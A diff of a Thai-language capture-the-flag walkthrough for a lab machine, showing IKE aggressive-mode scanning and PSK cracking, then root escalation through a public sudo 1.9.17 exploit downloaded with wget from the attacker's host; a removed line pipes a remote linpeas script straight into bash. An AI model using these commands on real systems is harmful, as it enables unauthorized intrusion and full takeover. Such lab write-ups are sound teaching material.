@@ -99,7 +99,10 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
 ```
 
-หลังจากนี้ทำตามนี้ละ Ref: https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
+เอาไปค้นดูคือไร เจออันนี้ <b>Ref:</b> https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
+{img2}
+
+ใช้คำสั่ง `ike-scan -M -A 10.10.11.87` เพื่อสแกนเป้าหมายแบบ `Aggressive Mode (-A)` และแสดงรายละเอียดการ `Handshake (-M)`
 
 ```
 $ ike-scan -M -A 10.10.11.87
@@ -116,7 +119,6 @@ Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/
 
 Ending ike-scan 1.9.6: 1 hosts scanned in 0.101 seconds (9.92 hosts/sec).  1 returned handshake; 0 returned notify
 ```
-
 
 ```
 $ ike-scan -A --pskcrack 10.10.11.87
@@ -175,9 +177,87 @@ drwx------ 2 ike  ike  4.0K Sep 16 10:21 .ssh
 ike@expressway:~$ cat user.txt
 5785[...]34a4
 ```
-ต่อไปหาทางยกระดับสิทธิ์ (Privilege Escalation) เป็น `root`
+ต่อไปหาทางยกระดับสิทธิ์ (Privilege Escalation) เป็น `root` ก็หาข้อมูล
 
+```
+ike@expressway:/tmp/.r3z$ sudo -l
+Password: 
+Sorry, user ike may not run sudo on expressway.
 
-curl http://10.10.XX.XXX/linpeas.sh | bash
+ike@expressway:/tmp/.r3z$ sudo --version
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+```
+Ok ก็เห็นว่ารุ่นของ `sudo` เป็น `1.9.17` ลองเอาไปค้นหาดูพบว่ามี CVE
 
+<b>URL:</b> https://www.exploit-db.com/exploits/52352
+{img3}
 
+ทดสอบโหลด Bash script มาใช้
+
+```
+ike@expressway:/tmp/.r3z$ wget http://10.10.XX.XXX/52352.txt
+--2025-09-24 14:25:05--  http://10.10.XX.XXX/52352.txt
+Connecting to 10.10.XX.XXX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1104 (1.1K) [text/plain]
+Saving to: ‘52352.txt’
+
+52352.txt               100%[===============================>]   1.08K  --.-KB/s    in 0s      
+
+2025-09-24 14:25:05 (138 MB/s) - ‘52352.txt’ saved [1104/1104]
+
+ike@expressway:/tmp/.r3z$ rm 52352.sh 
+ike@expressway:/tmp/.r3z$ ls
+52352.txt
+ike@expressway:/tmp/.r3z$ mv 52352.txt 52352.sh
+ike@expressway:/tmp/.r3z$ ./52352.sh 
+-bash: ./52352.sh: Permission denied
+ike@expressway:/tmp/.r3z$ chmod +x 52352.sh 
+ike@expressway:/tmp/.r3z$ ./52352.sh 
+-bash: ./52352.sh: /bin/bash^M: bad interpreter: No such file or directory
+```
+
+`!/bin/bash^M` ติดปัญหาเกี่ยวกับ Line endings (การขึ้นบรรทัด) นิดหน่อย แก้ด้วย
+
+```
+$ sudo apt install dos2unix
+$ dos2unix 52352.sh             
+dos2unix: converting file 52352.sh to Unix format...
+```
+
+จากนั้น `wget` `chmod` และสั่งการ Bash script อีกครั้ง
+
+```
+ike@expressway:/tmp/.r3z$ ./52352.sh 
+[*] Running exploit…
+root@expressway:/#
+root@expressway:/# id
+uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
+```
+
+ตอนนี้เป็น `root` แล้ว 
+
+```
+root@expressway:/# ls -lha /root
+total 44K
+drwx------  6 root root 4.0K Sep 24 14:20 .
+drwxr-xr-x 18 root root 4.0K Sep 16 16:02 ..
+lrwxrwxrwx  1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwx------  3 root root 4.0K Sep 16 16:02 .config
+drwx------  3 root root 4.0K Sep 16 16:02 .gnupg
+-rw-------  1 root root   20 Sep 16 15:51 .lesshst
+drwxr-xr-x  3 root root 4.0K Sep 16 16:02 .local
+lrwxrwxrwx  1 root root    9 Sep 16 10:24 .mariadb_history -> /dev/null
+-rw-r--r--  1 root root  132 May 12 20:25 .profile
+-rw-r-----  1 root root   33 Sep 24 14:20 root.txt
+-rw-r--r--  1 root root   66 May 23 21:49 .selected_editor
+drwx------  2 root root 4.0K Sep 16 16:02 .ssh
+root@expressway:/# cat /root/root.txt
+bdfd[...]b803
+```
+{img4}
